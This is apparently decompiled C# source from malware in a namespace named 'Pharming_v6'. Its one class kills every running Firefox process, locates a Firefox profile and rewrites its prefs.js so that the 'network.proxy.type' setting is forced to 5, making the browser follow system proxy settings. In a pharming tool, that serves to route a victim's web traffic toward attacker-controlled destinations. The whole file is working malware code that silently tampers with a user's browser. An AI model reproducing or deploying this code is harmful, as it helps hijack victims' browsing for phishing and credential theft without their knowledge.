using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace Pharming_v6;

[StandardModule]
internal sealed class firefox
{
	public static void firefox()
	{
		Process[] processesByName = Process.GetProcessesByName("firefox");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		string text = "";
		string[] directories = Directory.GetDirectories(Module1.appdata + "\\Mozilla\\Firefox\\Profiles\\");
		foreach (string text2 in directories)
		{
			text = text2;
		}
		if (File.Exists(text + "\\prefs.js"))
		{
			StreamReader streamReader = new StreamReader(text + "\\prefs.js");
			string text3 = streamReader.ReadToEnd();
			streamReader.Close();
			string path = text + "\\1024.js";
			string text4 = "user_pref(";
			string text5 = "network.proxy.type";
			string text6 = ", 1);";
			string text7 = ", 5);";
			string text8 = ", 2);";
			string text9 = ", 3);";
			string text10 = ", 4);";
			string oldValue = text4 + "\"" + text5 + "\"" + text6;
			string text11 = text4 + "\"" + text5 + "\"" + text7;
			string oldValue2 = text4 + "\"" + text5 + "\"" + text8;
			string oldValue3 = text4 + "\"" + text5 + "\"" + text9;
			string oldValue4 = text4 + "\"" + text5 + "\"" + text10;
			if (text3.Contains(text4 + "\"" + text5 + "\"" + text6))
			{
				StreamWriter streamWriter = new StreamWriter(path, append: false);
				streamWriter.WriteLine(text3.Replace(oldValue, text11));
				streamWriter.Close();
			}
			else if (text3.Contains(text4 + "\"" + text5 + "\"" + text8))
			{
				StreamWriter streamWriter2 = new StreamWriter(path, append: false);
				streamWriter2.WriteLine(text3.Replace(oldValue2, text11));
				streamWriter2.Close();
			}
			else if (text3.Contains(text4 + "\"" + text5 + "\"" + text9))
			{
				StreamWriter streamWriter3 = new StreamWriter(path, append: false);
				streamWriter3.WriteLine(text3.Replace(oldValue3, text11));
				streamWriter3.Close();
			}
			else if (text3.Contains(text4 + "\"" + text5 + "\"" + text10))
			{
				StreamWriter streamWriter4 = new StreamWriter(path, append: false);
				streamWriter4.WriteLine(text3.Replace(oldValue4, text11));
				streamWriter4.Close();
			}
			else if (text3.Contains(text4 + "\"" + text5 + "\"" + text7))
			{
				StreamWriter streamWriter5 = new StreamWriter(path, append: false);
				streamWriter5.WriteLine(text3.Replace(text11, text11));
				streamWriter5.Close();
			}
			else
			{
				StreamWriter streamWriter6 = new StreamWriter(path, append: false);
				streamWriter6.WriteLine(text3.Insert(0, text11));
				streamWriter6.Close();
			}
			File.Delete(text + "\\prefs.js");
			File.Move(text + "\\1024.js", text + "\\prefs.js");
		}
		else
		{
			Console.WriteLine("B");
		}
	}
}
